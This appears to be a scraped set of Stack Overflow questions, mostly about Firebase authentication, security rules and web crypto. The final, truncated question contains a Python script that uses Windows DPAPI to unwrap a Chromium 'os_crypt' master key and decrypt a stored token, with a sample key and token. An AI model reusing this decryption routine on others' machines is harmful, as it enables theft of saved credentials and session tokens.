<li>Contacted firebase support, told me it was an unusual problem, that I should wipe my entire database and see if it persists (not possible, app in production with clients using it)</li>
<li>Found this guy (first one I find all over internet with null in location too) <a href=""https://stackoverflow.com/q/78108477/12654567"">Firestore Security Rules: Error running simulation –An unknown error occurred</a> with I think the same problem (resource = null)</li>
<li>Created another firebase project and start the firestore database, same null at Location.</li>
<li>Checked another firebase project that I haven't touched in over a year, same null at Location.</li>
</ul>
"
"<p>I want to fetch all users from the same company as the logged in user.</p>
<p>With <code>getUsersFromCompany(this.userData.company)</code> I do only get the user itself and nobody else.
When changing manually to another Company-ID (which is not the same ID as this.userData.company) all users are loading: <code>getUsersFromCompany('anotherCompanyID)</code></p>
<pre><code> getUsersFromCompany(company) {
    return this.afs.collection('users', ref =&gt; ref.where('company', '==', company)) 
      .valueChanges({ idField: 'uid' }).pipe(take(1)) as Observable&lt;UserData&gt;
  }
</code></pre>
<p>It seems to block all users when the company ID is the same, but why/how?</p>
<p>My firebase security rules for testing are set to</p>
<pre><code> match /users/{userId} {
     allow read: if request.auth != null    
}
</code></pre>
<p>Persistance was on, is now off</p>
"
"<p>so i've built a frontend and now i'm working on a backend that has security rules based on custom claims. I'm getting an error that i can't understand. I've run the callable functions and logged out and back in but i still get an error message when i try to change document details. I'm trying to edit a document in firestore, a document belonging to the user. So its either the user makes a change or an admin can make a change.</p>
<p>edit submission:</p>
<pre><code> const onSubmit = async () =&gt; {
    const editRef = doc(db, `images/${imageID}`);
try {
        await updateDoc(editRef, {
          aLabels: aLabels,
        });
      } catch (error) {
        console.log(error.message);
        toast.error(&quot;Something went wrong&quot;);
      }
}

</code></pre>
<p><code>adminClaims.js</code></p>
<pre><code>const functions = require(&quot;firebase-functions&quot;);
const admin = require(&quot;firebase-admin&quot;);

exports.setAdminClaims = functions.https.onRequest(async (req, res) =&gt; {
  const adminUIDs = [
    &quot;pyqPlr3BT7LwzxBerxi1seqDrv6x&quot;
  ];

  await Promise.all(
    adminUIDs.map((uid) =&gt;
      admin.auth().setCustomUserClaims(uid, { admin: true })
    )
  );

  res.send(&quot;Done configuring rules&quot;);
});
</code></pre>
<p>firestore security rules</p>
<pre><code>rules_version = '2';
service cloud.firestore {
  match /databases/{database}/documents {
    match /{document=**} {
    allow read, write: if false; //line 5
    }
match /images/{image} {
    allow read: if true;
      allow create: if isLoggedIn() //line 16
      allow update, delete: if isLoggedIn() &amp;&amp; isOwner() || isAdmin() 
    }

function isLoggedIn() {
    return request.auth.uid != null;
    }

    function isOwner() {
      return request.auth.uid == resource.data.user
    }

    function isAdmin() {
      return request.auth.token.role.admin == true
    }
}


</code></pre>
<p>Error message</p>
<blockquote>
<p>PERMISSION_DENIED:  false for 'update' @ L5, evaluation error at
L16:32 for 'update' @ L16, false for 'update' @ L5, Property role is
undefined on object. for 'update' @ L16</p>
</blockquote>
"
"<p>i'm working on an admin website that i've built using React and firebase and i want the whole site to be accessible only to those who are logged in. I want to do it from one place though as opposed to having to add it to every page which is what this requires:</p>
<pre><code>firebase.auth().onAuthStateChanged(user =&gt; {
  if(!user) {
    window.location = 'login.html'; //If User is not logged in, redirect to login page
  }
});
</code></pre>
<p>I am thinking of the <code>app.js</code> page but i'm having problems. Here is my attempt:</p>
<pre><code>export default function App() {
  const [isLoggedIn, setIsLoggedIn] = useState();
  const navigate = useNavigate();

  const setLoggedInFn = () =&gt; {
    setIsLoggedIn(true);
  };

  const setLoggedOutFn = () =&gt; {
    setIsLoggedIn(false);
  };

  useEffect(() =&gt; {
    if (isLoggedIn === false) {
      navigate(&quot;/&quot;);
    }
  }, [isLoggedIn, navigate]);

  return (
    &lt;&gt;
      &lt;BrowserRouter&gt;
        &lt;Navigation setLoggedIn={setLoggedInFn} setLoggedOut={setLoggedOutFn} /&gt;
        &lt;Routes&gt;
          &lt;Route index element={&lt;Home /&gt;} /&gt;
          &lt;Route path=&quot;/page1&quot; element={&lt;Page1 /&gt;} /&gt;
          &lt;Route path=&quot;/page2&quot; element={&lt;Page /&gt;} /&gt;
        &lt;/Routes&gt;
      &lt;/BrowserRouter&gt;
    &lt;/&gt;
  );
}
</code></pre>
<p>But i get the following error:</p>
<blockquote>
<p>useNavigate() may be used only in the context of a  component.</p>
</blockquote>
<p>I understand the error but i want to know if its possible to do it in one place like app.js</p>
<p>FYI, navigation is in every page so i decided that that's where i should monitor the logged in state.
A section of <code>Navigation.js</code></p>
<pre><code>useEffect(() =&gt; {
    const unsubscribe = onAuthStateChanged(
      auth,
      (user) =&gt; {
        // console.log(user);
        if (user) {
          setUserId(user.uid);
          setIsLoggedInFn();
        } else {
          setUserId(&quot;&quot;);
          setIsLoggedOutFn();
        }
      },
      []
    );

    return unsubscribe;
  }, []);
</code></pre>
<p>Is there a way to block the entire site from one place?</p>
"
"<p>I’m developing a React Native app using Expo and attempting to upload a profile picture to Firebase Storage using Expo’s ImagePicker. The app allows users to take a photo or choose one from their library and then upload the selected image to Firebase Storage.</p>
<p>However, I’m encountering a FirebaseError: Missing or insufficient permissions error when attempting to upload the image. The error occurs in the uploadImageToStorage function, specifically when calling uploadBytesResumable to upload the image to Firebase Storage.</p>
<pre><code>    const handleTakePhoto = async () =&gt; {
        const { status } = await ImagePicker.requestCameraPermissionsAsync();
        if (status !== &quot;granted&quot;) {
            alert(&quot;Sorry, we need camera roll permissions to make this work!&quot;);
            return;
        }

        const result = await ImagePicker.launchCameraAsync({
            mediaTypes: ImagePicker.MediaTypeOptions.Images,
            allowsEditing: true,
            aspect: [1, 1],
            quality: 0.2,
        });

        if (result.canceled) {
            // Handle cancellation
        } else if (result.type === 'dismissed') {
            // MainActivity was destroyed, get the pending result
            const pendingResult = await ImagePicker.getPendingResultAsync();
            if (!pendingResult.cancelled) {
                uploadImageToStorage(pendingResult.assets[0].uri);
            }
        } else {
            uploadImageToStorage(result.assets[0].uri);
        }
    };

    const handleChooseFromLibrary = async () =&gt; {
        const { status } = await ImagePicker.requestMediaLibraryPermissionsAsync();
        if (status !== &quot;granted&quot;) {
            alert(&quot;Sorry, we need camera roll permissions to make this work!&quot;);
            return;
        }

        const result = await ImagePicker.launchImageLibraryAsync({
            mediaTypes: ImagePicker.MediaTypeOptions.Images,
            allowsEditing: true,
            aspect: [1, 1],
            quality: 0.2,
        });

        if (!result.canceled) {
            uploadImageToStorage(result.assets[0].uri);
        }
    };

    const uploadImageToStorage = async (uri) =&gt; {
        const user = auth.currentUser;
        const imageName = `profile-picture-${user.uid}`;
        const response = await fetch(uri);
        const blob = await response.blob();
        const storageRef = ref(
            storage,
            `users/${user.uid}/profilePictures/${imageName}`
        );

        try {
            const snapshot = await uploadBytesResumable(storageRef, blob);
            const downloadURL = await getDownloadURL(snapshot.ref);

            // Update profile and database with the new photoURL
            await updateProfile(user, { photoURL: downloadURL });
            await updateDoc(doc(db, &quot;users&quot;, user.uid), { photoURL: downloadURL });

            // Update the profile picture state and close the modal
            setProfilePic(downloadURL);
            addProfilePicModalRef.current.close();
        } catch (error) {
            console.error(&quot;Error uploading profile picture: &quot;, error);
        }
    };

    const handleDeleteProfilePic = async () =&gt; {
        const user = auth.currentUser;
        const storageRef = ref(
            storage,
            `users/${user.uid}/profilePictures/profile-picture-${user.uid}`
        );
        try {
            await deleteObject(storageRef);
            await updateProfile(user, { photoURL: null });
            await updateDoc(doc(db, &quot;users&quot;, user.uid), { photoURL: null });
            setProfilePic(null);
        } catch (error) {
            console.error(&quot;Error deleting profile picture: &quot;, error);
        }
    };
</code></pre>
<p>Firebase security rules</p>
<pre><code>rules_version = '2';
service firebase.storage {
  match /b/{bucket}/o {
    match /profile/{userId}/profile-pic/{allPaths=**} {
      allow read: if request.auth != null;
      allow write: if request.auth != null &amp;&amp; request.auth.uid == userId;
    }
  }
}
</code></pre>
"
"<p>I've updated my Kotlin Android app, which uses Firebase Auth, Database, and Storage, increasing targetSdkVersion and dependencies to current versions. While everything operates as expected when deployed from Android Studio, downloading the app from the Play Store, or generating signed APK and deploying manually, results in all sign-in methods failing - despite working previously.</p>
<p>Discussions on Stack Overflow (<a href=""https://stackoverflow.com/questions/48439480/firebase-google-authentication-not-working-in-release-mode/50868434#50868434"">1</a>, <a href=""https://stackoverflow.com/questions/64360590/firebase-authentication-works-only-on-debug-version"">2</a>, <a href=""https://stackoverflow.com/questions/50664680/google-authentication-is-not-working-after-publishing-in-play-store"">3</a>), suggest issues often stem from incorrect SHA certificate fingerprints, particularly the mix-up between the upload and the App Signing key from Google Play Console. My Firebase project, however, already includes both SHA-1 &amp; SHA-256 of the App Signing key. Temporarily removing these fingerprints confirmed their significance by altering app behavior, for example: OTPs for phone sign-ins are received only while fingerprints are set (but sign-in fails).</p>
<p>Thus, I'm at a loss for what could be causing the sign-in methods to fail only in the signed version, and how to investigate it, as the problem does not occur in a debuggable version. Has anyone encountered a similar issue or can offer insights into potential causes and solutions?</p>
<p><strong>AuthUI screen behavior for clicking each Auth provider in release versions:</strong></p>
<ul>
<li><strong>Google</strong>: The app freezes on the AuthUI screen with a progress bar showing indefinitely.</li>
<li><strong>Twitter</strong>: Successfully opens the browser for authentication and indicates success, but causes the app to close upon redirection back.</li>
<li><strong>Email</strong>: No email is received.</li>
<li><strong>Phone</strong>: Upon receiving the OTP, the 'Phone Number' field turns red, displaying an &quot;An unknown error occurred.&quot; message.</li>
</ul>
<p><strong>Google Smart lock pop-up behavior in different versions:</strong></p>
<ul>
<li><strong>Debug version</strong>: Shows Gmail based account options with their current profile photo set in the app (saved in Firebase).</li>
<li><strong>Local signed APK</strong>: Pop-up does not show at all.</li>
<li><strong>Play Store version</strong>: Shows Gmail based account options with no photos.</li>
</ul>
"
"<p>I am new to react native and firebase</p>
<p>I had a issue regard to my app which is a cross-platform app(android, ios). I encounter this issue where i just cannot verify user phone number using the firebase phone authentication</p>
<p><strong>Here is my code:</strong></p>
<pre><code>`import React, { useState, useEffect, useRef } from &quot;react&quot;;
import {
  View,
  StyleSheet,
  SafeAreaView,
  Text,
  TouchableOpacity,
  FlatList,
} from &quot;react-native&quot;;
import { LinearGradient } from &quot;expo-linear-gradient&quot;;
import {
  sharedStyles,
  windowWidth,
  windowHeight,
} from &quot;../../assets/shared/styles.js&quot;;
import Signup_email from &quot;./signup_email.js&quot;;
import Signup_email_verify from &quot;./signup_email_verify.js&quot;;
import Signup_phone from &quot;./signup_phone.js&quot;;
import Signup_phone_otp from &quot;./signup_phone_otp.js&quot;;
import Signup_password from &quot;./signup_password.js&quot;;
import { firebaseConfig } from &quot;../../config/config.js&quot;;
import firebase from &quot;firebase/compat/app&quot;;
import firestore from &quot;@react-native-firebase/firestore&quot;;
import {
  createUserWithEmailAndPassword,
  sendEmailVerification,
  getAuth,
  PhoneAuthProvider,
  RecaptchaVerifier,
  auth,
  signInWithPhoneNumber,
} from &quot;firebase/auth&quot;;
import { FirebaseRecaptchaVerifierModal } from &quot;expo-firebase-recaptcha&quot;;

const PaginationDot = ({ index, activeIndex }) =&gt; {
  return (
    &lt;View style={[styles.dot, index === activeIndex &amp;&amp; styles.activeDot]} /&gt;
  );
};

export default function Signup_base() {
  const [activeSlide, setActiveSlide] = useState(0);
  const [isEmailValid, setIsEmailValid] = useState(false);
  const [userEmail, setUserEmail] = useState(&quot;&quot;);
  const [authUser, setAuthUser] = useState(null);
  const [userPhone, setUserPhone] = useState(null);
  const recaptchaVerifier = useRef(null);
  const [verificationId, setVerificationId] = useState(null);
  const [code, setCode] = useState(&quot;&quot;);
  const auth = getAuth();

  const handleEmailEntered = (email) =&gt; {
    setUserEmail(email);
  };

  const handlePhoneEntered = (phone) =&gt; {
    setUserPhone(phone);
  };

  const handleEmailValidated = (isValid) =&gt; {
    setIsEmailValid(isValid);
  };

  // Generate data array based on the number of slide functions
  const data = Array.from({ length: 5 }, (_, index) =&gt; ({
    key: `Slide ${index + 1}`,
  }));

  useEffect(() =&gt; {
    const checkEmailVerification = async () =&gt; {
      const auth = getAuth();
      const user = auth.currentUser;

      if (user) {
        await user.reload();

        if (user.emailVerified &amp;&amp; activeSlide === 1) {
          // User's email is verified, proceed to the next slide
          setAuthUser(user);
          const nextIndex = (activeSlide + 1) % data.length;
          setActiveSlide(nextIndex);
        }
      }
    };

    const intervalId = setInterval(() =&gt; {
      checkEmailVerification();
    }, 1000); // Check every 1 seconds

    return () =&gt; clearInterval(intervalId); // Clear interval on component unmount
  }, [activeSlide]);

  const getSlideComponent = (index) =&gt; {
    switch (index) {
      case 0:
        return (
          &lt;Signup_email
            onEmailEntered={handleEmailEntered}
            onEmailValidated={handleEmailValidated}
          /&gt;
        );
      case 1:
        return &lt;Signup_email_verify email={userEmail} /&gt;;
      case 2:
        return &lt;Signup_phone onPhoneEntered={handlePhoneEntered} /&gt;;
      case 3:
        return &lt;Signup_phone_otp /&gt;;
      case 4:
        return &lt;Signup_password /&gt;;
      default:
        return &lt;&gt;&lt;/&gt;;
    }
  };

  const handleSignup_email = async () =&gt; {
    if (
      !(
        userEmail === null ||
        userEmail === undefined ||
        userEmail === &quot;&quot; ||
        !isEmailValid
      )
    ) {
      try {
        // Create a user with a temporary password
        const tempPassword = Math.random().toString(36).slice(-8);
        const { user } = await createUserWithEmailAndPassword(
          auth,
          userEmail,
          tempPassword
        );

        // Send email verification
        sendEmailVerification(user);

        await auth.onAuthStateChanged((user) =&gt; {
          if (user) {
            setAuthUser(user);
            // Navigate to the next screen or perform any desired action
            const nextIndex = (activeSlide + 1) % data.length;
            setActiveSlide(nextIndex);
          }
        });
      } catch (error) {
        if (error.code === &quot;auth/email-already-in-use&quot;) {
          // Handle case where the email is already in use
          alert(
            &quot;This email address is already registered. Please use a different email.&quot;
          );
        } else {
          // Handle other errors
          console.error(&quot;Error creating user:&quot;, error.message);
        }
      }
    } else if (
      !isEmailValid &amp;&amp;
      !(userEmail === undefined || userEmail === null || userEmail === &quot;&quot;)
    ) {
      alert(&quot;The entered email format is invalid.&quot;);
    } else if (
      userEmail === undefined ||
      userEmail === null ||
      userEmail === &quot;&quot;
    ) {
      alert(&quot;Please enter a valid email.&quot;);
    }
  };

  const handleSignup_email_verification = async () =&gt; {
    const auth = getAuth();
    const user = auth.currentUser;
    await user.reload();

    sendEmailVerification(user);
  };

  const newRecaptchaVerifier = () =&gt; {
    return new firebase.auth.RecaptchaVerifier(&quot;recaptcha-container&quot;, {
      size: &quot;invisible&quot;,
      callback: (response) =&gt; {
        // Recaptcha callback
      },
    });
  };

  const handleSignup_phone = async () =&gt; {
    // const appVerifier = newRecaptchaVerifier();
    // try {
    //   const confirmation = await signInWithPhoneNumber(auth, userPhone, appVerifier);
    // } catch (error) {
    //   console.error(error);
    // }

    // const result = await signInWithPhoneNumber(
    //   auth,
    //   userPhone,
    //   recaptchaVerifier.current
    // );

    // const phoneProvider = new firebase.auth.PhoneAuthProvider();
    // phoneProvider

    //   .verifyPhoneNumber(userPhone, recaptchaVerifier.current)
    //   .then(setVerificationId);
    //   setUserPhone(&quot;&quot;);

    if (userPhone) {
      try {
        const phoneAuthProvider = new firebase.auth.PhoneAuthProvider(auth);
        const recaptchaVerifier = newRecaptchaVerifier(); // Create a new RecaptchaVerifier
        const verificationId = await signInWithPhoneNumber(
          phoneAuthProvider,
          userPhone,
          recaptchaVerifier
        );

        // Move to the next slide
        const nextIndex = (activeSlide + 1) % data.length;
        setActiveSlide(nextIndex);
      } catch (error) {
        console.error(&quot;Error sending SMS verification code:&quot;, error.message);
      }
    } else {
      alert(&quot;Please enter a valid phone number.&quot;);
    }
  };

  // const confirmCode = () =&gt; {
  //   const credential = firebase.auth.PhoneAuthProvider.credential(
  //     verificationId,
  //     code
  //   );
  //   firebase.auth().signInWithCredentials(credential)
  //   .then(() =&gt; {
  //     setCode('');
  //   })
  //   .catch((error) =&gt; {
  //     alert(error);
  //   })
  //   Alert.alert(&quot;&quot;)
  // }

  return (
    &lt;SafeAreaView style={styles.container}&gt;
      &lt;View&gt;
        {/* Pagination Dots */}
        &lt;View style={styles.paginationContainer}&gt;
          &lt;FlatList
            data={data}
            horizontal
            showsHorizontalScrollIndicator={false}
            pagingEnabled
            keyExtractor={(item, index) =&gt; index.toString()}
            renderItem={({ index }) =&gt; (
              &lt;PaginationDot index={index} activeIndex={activeSlide} /&gt;
            )}
          /&gt;
        &lt;/View&gt;
      &lt;/View&gt;

      {/* Render the appropriate slide component based on the active slide */}
      {getSlideComponent(activeSlide)}

      {/* Additional Signup content */}
      &lt;TouchableOpacity
        onPress={() =&gt; {
          handleSignup_phone();
          // const nextIndex = (activeSlide + 1) % data.length;
          // setActiveSlide(nextIndex);
          // if (activeSlide === 0) {
          //   handleSignup_email();
          // } else if (activeSlide === 1) {
          //   handleSignup_email_verification();
          // } else if (activeSlide === 2) {
          //   handleSignup_phone();
          // }
        }}
      &gt;
        &lt;LinearGradient
          colors={[&quot;#5899E2&quot;, &quot;#12B3CA&quot;]}
          style={[sharedStyles.button, { width: windowWidth * 0.8 }]}
          start={{ x: 0, y: 0.5 }}
          end={{ x: 1, y: 0.5 }}
        &gt;
          {activeSlide !== 1 &amp;&amp; (
            &lt;Text style={sharedStyles.buttonText}&gt;Next&lt;/Text&gt;
          )}
          {activeSlide === 1 &amp;&amp; (
            &lt;Text style={sharedStyles.buttonText}&gt;
              Resend Verification Email
            &lt;/Text&gt;
          )}
        &lt;/LinearGradient&gt;
      &lt;/TouchableOpacity&gt;
    &lt;/SafeAreaView&gt;
  );
}

const styles = StyleSheet.create({
  container: {
    flex: 1,
    justifyContent: &quot;flex-start&quot;,
    flexDirection: &quot;column&quot;,
    alignItems: &quot;center&quot;,
  },
  paginationContainer: {
    flexDirection: &quot;row&quot;,
    justifyContent: &quot;center&quot;,
    alignItems: &quot;center&quot;,
    marginTop: windowHeight * 0.02,
  },
  dot: {
    width: 15,
    height: 15,
    borderRadius: 50,
    backgroundColor: &quot;#BDBDBD&quot;, // Inactive dot color
    marginHorizontal: windowWidth * 0.03,
    alignSelf: &quot;center&quot;,
  },
  activeDot: {
    backgroundColor: &quot;#2196F3&quot;, // Active dot color
    width: 20,
    height: 20,
    alignSelf: &quot;center&quot;,
  },
});
`
</code></pre>
<p>I want the user to receive a SMS using the firebase phone auth with 6-digit and user will able to use the number receive to verify thier phone number. This should work for both android and ios.</p>
"
"<p>I'm working on Mission Control - a time management app and I recently added Google auth using Firebase (Email and password was the first auth method).</p>
<p>While testing the Sign up/ in with Google directly from Android Studio evertything works fine but when I upload the app to the store and download it from there it doesn't.</p>
<p>Pressing the Google btn opens your existing email list to choose from and tha'ts it - no sign up/in w/o any erros..</p>
<p>If anyone had any experience with this issue I would love some help :)</p>
<p>Here's the app:
<a href=""https://play.google.com/store/apps/details?id=com.missioncontrol.timeplanning"" rel=""nofollow noreferrer"">https://play.google.com/store/apps/details?id=com.missioncontrol.timeplanning</a></p>
<p>The code:</p>
<pre><code>private fun initSignInWithGoogle() //Called from onCreate
    {
        //Actions for signing in w google:

        //Sign w Google btn
        val btnSignWGoogle = binding?.btnSignWGoogle

        // Initialize sign in options the client-id is copied form Firebase auth
        val googleSignInOptions = GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken(&quot;/*Here is the id*/&quot;)
            .requestEmail()
            .build()

        // Initialize sign in client
        googleSignInClient = GoogleSignIn.getClient(this@IntroActivity, googleSignInOptions)

        btnSignWGoogle?.setOnClickListener { // Initialize sign in intent
            val intent: Intent = googleSignInClient.signInIntent
            // Start activity for result
            startActivityForResult(intent, Constants.GOOGLE_SIGN_REQUEST_CODE) //Show emails
        }
}

override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)

        // Check whether we returned from email selection and an email was selected
        if (requestCode == Constants.GOOGLE_SIGN_REQUEST_CODE&amp;&amp;resultCode == RESULT_OK) {
            // When request code is equal to GOOGLE_SIGN_REQUEST_CODE
             signInAccountTask =
                GoogleSignIn.getSignedInAccountFromIntent(data)

            //Get the user data
             googleSignInAccount = signInAccountTask.result
             displayName = googleSignInAccount?.displayName!!
             email = googleSignInAccount?.email!!
             photoUrl = googleSignInAccount?.photoUrl?.toString()!!


            Log.d(&quot;SignInGoogle&quot;, &quot;Display Name: $displayName&quot;)
            Log.d(&quot;SignInGoogle&quot;, &quot;Email: $email&quot;)
            Log.d(&quot;SignInGoogle&quot;, &quot;Photo URL: $photoUrl&quot;)


            //Checks if the email is in the USERS collection
            FireStoreClass().checkEmailUniqueness(email!!, this) { isUnique -&gt;
            }
        }
        else{
            Log.d(&quot;SignInGoogle&quot;, &quot;Error + &quot; + requestCode.toString())
        }
    }

    fun isEmailUnique(isUnique: Boolean)
    {
        //Called from firebase
        if (isUnique) {
            Log.d(&quot;SignInGoogle&quot;, &quot;Email unique&quot;)
            //Email is not used - create new user and go to trailer
            try {
                try {              
                    if (googleSignInAccount != null) {
                        // When sign in account is not equal to null initialize auth credential
                        val authCredential: AuthCredential = GoogleAuthProvider.getCredential(
                            googleSignInAccount.idToken, null
                        )
                        // Check credential and sign the user up
                        auth.signInWithCredential(authCredential)
                            .addOnCompleteListener(this) { task -&gt;
                                // Check sign up
                                if (task.isSuccessful) {
                                    // When task is successful redirect
                                    Log.d(&quot;SignInGoogle&quot;, &quot;Trying to add user to collection&quot;)
                                    val user = com.missioncontrol.timeplanning.models.User(&quot;&quot;, displayName!!,email!!,photoUrl?:&quot;&quot;,0,&quot;&quot;,)
                                    FireStoreClass().registerUser(this, user)
                                    // Display Toast
                                    displayToast(&quot;Thank you for registering&quot;)
                                } else {
                                    // When task is unsuccessful display Toast
                                    displayToast(
                                        &quot;Authentication Failed :&quot; + task.exception?.message
                                    )
                                }
                            }
                    }
                } catch (e: ApiException) {
                    e.printStackTrace()
                    Log.d(&quot;SignInGoogle&quot;, e.toString())
                }

            }
            catch (e: Exception)
            {
                Toast.makeText(this@IntroActivity, &quot;Error please try again or contact support&quot;, Toast.LENGTH_SHORT).show()
            }

        }
        else
        {//Email exists - sign in
            Log.d(&quot;SignInGoogle&quot;, &quot;Email not unique&quot;)

            if (signInAccountTask.isSuccessful) {
                Log.d(&quot;SignInGoogle&quot;, &quot;Success sign in&quot;)
                // When google sign in successful initialize string
                val s = &quot;Google sign in successful&quot;
                // Display Toast
                displayToast(s)
                // Initialize sign in account
                try {
                    // Initialize sign in account
                    if (googleSignInAccount != null) {
                        // When sign in account is not equal to null initialize auth credential
                        val authCredential: AuthCredential = GoogleAuthProvider.getCredential(
                            googleSignInAccount.idToken, null
                        )
                        // Check credential
                        auth.signInWithCredential(authCredential)
                            .addOnCompleteListener(this) { task -&gt;
                                // Check condition
                                if (task.isSuccessful) {
                                    // When task is successful redirect to Main activity
                                    startActivity(
                                        Intent(
                                            this@IntroActivity,
                                            MainActivity::class.java
                                        ).setFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                                    )
                                } else {
                                    // When task is unsuccessful display Toast
                                    displayToast(
                                        &quot;Authentication Failed :&quot; + task.exception?.message
                                    )
                                }
                            }
                    }
                } catch (e: ApiException) {
                    e.printStackTrace()
                    Log.d(&quot;SignInGoogle&quot;, e.toString())
                }
            }
            else
            {
                Log.d(&quot;SignInGoogle&quot;, signInAccountTask.toString())
            }
        }
    }

    fun userRegisteredSuccess() //Gets called automatically from FireStoreClass upon registration
    {
        //User was added to collection successfully - go to trailer
        Log.d(&quot;SignInGoogle&quot;, &quot;added user to collection&quot;)

        Toast.makeText(this, &quot;Thanks for registering&quot; +
                &quot;.&quot; , Toast.LENGTH_LONG).show()
        hideProgressDialog()

                    startActivity(Intent(this, TrailerActivity::class.java))
                    finish()
    }
</code></pre>
<p>Running it on several phone - issue is the same on all of them</p>
"
"<p>How does fortify calculates the estimated remediation effort score?</p>
<p>In the page 129 of this document, the product manual says what the score is, what it means, but it does not provide any clue on how it's calculated.</p>
<p><a href=""https://www.microfocus.com/documentation/fortify-static-code-analyzer-and-tools/1820/AWB_Guide_18.20.pdf"" rel=""nofollow noreferrer"">https://www.microfocus.com/documentation/fortify-static-code-analyzer-and-tools/1820/AWB_Guide_18.20.pdf</a></p>
"
"<p>I have an app that contains Google sign-in functionality and am using Firebase Authentication to do that.</p>
<p>Everything works perfectly when building directly to the device.
However, after exporting the aab file and uploading it to Google Play Console for publishing, I tried downloading the signed apk file to install and realized that this login function did not work.</p>
<p>I wonder if anyone is having the same problem as me?</p>
"
"<p>I'm trying to use <code>crypto.subtle.digest()</code> as part of a checksum function for a file upload project I'm working on but for some reason I keep getting the following error:</p>
<pre><code>upload-form.tsx:129 Uncaught TypeError: Cannot read properties of undefined (reading 'digest')
</code></pre>
<p>Which suggests that <code>crypto.subtle</code> is undefined. I understand that <code>crypto.subtle</code> is <a href=""https://developer.mozilla.org/en-US/docs/Web/API/Crypto/subtle"" rel=""nofollow noreferrer"">only available in a secure contexts (HTTPS)</a>, but I am trying to use it within <code>http://localhost:3000</code> which I read was <a href=""https://developer.mozilla.org/en-US/docs/Web/Security/Secure_Contexts"" rel=""nofollow noreferrer"">also considered a secure context</a>. I have tried it in both Chrome &amp; Firefox, and get the same undefined error in both.</p>
<h1>For Context:</h1>
<p>I am using <code>NextJS 14.1.0</code> and <code>Node.js v20.11.0</code></p>
<p>I tested this on <code>http://localhost:3000</code> on <code>Chrome v121.0.6167.160</code> and <code>Firefox ESR v115.3.0esr</code></p>
<p>I am using <code>import * as crypto from &quot;crypto&quot;</code> within a Client Component (I have <code>&quot;use client&quot;;</code> at the top)</p>
<p>This is the checksum function I'm using which I got from this <a href=""https://youtu.be/t-lhgq7Nfpc?si=etnjsj5IwM2h9Iyv&amp;t=1486"" rel=""nofollow noreferrer"">Youtube tutorial</a> but only briefly shows it.</p>
<p>The comments are from ChatGPT who also came up with basically the same function.</p>
<pre><code>//upload-form.tsx
&quot;use client&quot;;

... //imports

import * as crypto from &quot;crypto&quot;;

... //some code

const computeSHA256 = async (file: File) =&gt; {
  // Convert file to an array buffer
  const buffer = await file.arrayBuffer();
  
  // Calculate SHA-256 hash
  const hashBuffer = await crypto.subtle.digest(&quot;SHA-256&quot;, buffer);

  // Convert hashBuffer to hexadecimal representation
  const hashArray = Array.from(new Uint8Array(hashBuffer));
  const hashHex = hashArray
    .map((byte) =&gt; byte.toString(16).padStart(2, &quot;0&quot;))
    .join(&quot;&quot;);

  return hashHex;
};

... //rest of file
</code></pre>
<p>Using <code>crypto.webcrypto.subtle.digest()</code>, I get the error:</p>
<pre><code>upload-form.tsx:133 Uncaught TypeError: Cannot read properties of undefined (reading 'subtle')
</code></pre>
<p>Which suggests that <code>crypto.webcrypto</code> is undefined.</p>
<p><strong>If I use <code>window.crypto.subtle.digest()</code> instead, then the function runs perfectly fine, but I am wondering if that is the right way to go about it.</strong></p>
<p>I used <code>console.log(crypto)</code> to see what properties it had, and neither <code>webcrypto</code> or <code>subtle</code> was there.</p>
<p>Directly printing <code>window.crypto</code> within Chrome's console shows that it does have <code>subtle</code></p>
"
"<p>The following script should decrypt the token &quot;djEwe5t74Rc5Ded4Ozm++rCKmYTCd7wxI1X6L1GywnslmeUs4240q72bcuotAMSp2p3S2ovrqQoFLRNJ9GzelmF+beLrVJfPnT7cdg+7e+ZRYBfn9uiTL/4VkL8Sp24TTgoVrDA+gg==&quot; with the encryption key</p>
<pre><code>{&quot;os_crypt&quot;:{&quot;encrypted_key&quot;:&quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACwiiOT7hVKSpqHHKmfelp6AAAAAAIAAAAAABBmAAAAAQAAIAAAAEr1FtZCawv6cT1z5zzXxZ30h4O7Ity3EBLfTdtM0oO6AAAAAA6AAAAAAgAAIAAAACpGZwsT0RKSCl/ukX6ZxNytKpAbHgRmqLqpRW++TcxEMAAAAC8HEpNDthKadJlMBCAvonE1QXVGTjE4Hh0TJv75iz48R2eb93lG9zxpr8xhh1C7e0AAAAAWODcIFOqibQmHRL/fnDgtFy7JdNC7NynDGMtcucS4R5yD92+2UFPFquqfEbpu/gIW5eMv3LQIQDJlR5I53KRs&quot;}}
</code></pre>
<p>The script is as follows</p>
<pre class=""lang-py prettyprint-override""><code>import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from win32crypt import CryptUnprotectData

# Función decrypt_val
def decrypt_val(buff: bytes, master_key: bytes) -&gt; str:
    iv = buff[3:15]
    payload = buff[15:]

    cipher = Cipher(algorithms.AES(master_key), modes.GCM(iv), backend=default_backend())
    decryptor = cipher.decryptor()

    decrypted_pass = decryptor.update(payload) + decryptor.finalize()[:-16]
    decrypted_pass = decrypted_pass.decode()
    return decrypted_pass

# Función get_master_key
def get_master_key() -&gt; bytes:
    # Esta es la master_key proporcionada
    master_key = &quot;RFBBUEkBAAAA0Iyd3wEV0RGMegDAT8KX6wEAAACwiiOT7hVKSpqHHKmfelp6AAAAAAIAAAAAABBmAAAAAQAAIAAAAEr1FtZCawv6cT1z5zzXxZ30h4O7Ity3EBLfTdtM0oO6AAAAAA6AAAAAAgAAIAAAACpGZwsT0RKSCl/ukX6ZxNytKpAbHgRmqLqpRW++TcxEMAAAAC8HEpNDthKadJlMBCAvonE1QXVGTjE4Hh0TJv75iz48R2eb93lG9zxpr8xhh1C7e0AAAAAWODcIFOqibQmHRL/fnDgtFy7JdNC7NynDGMtcucS4R5yD92+2UFPFquqfEbpu/gIW5eMv3LQIQDJlR5I53KRs&quot;
    master_key = base64.b64decode(master_key)
    master_key = master_key[5:]
    master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
    return master_key

# Token codificado proporcionado
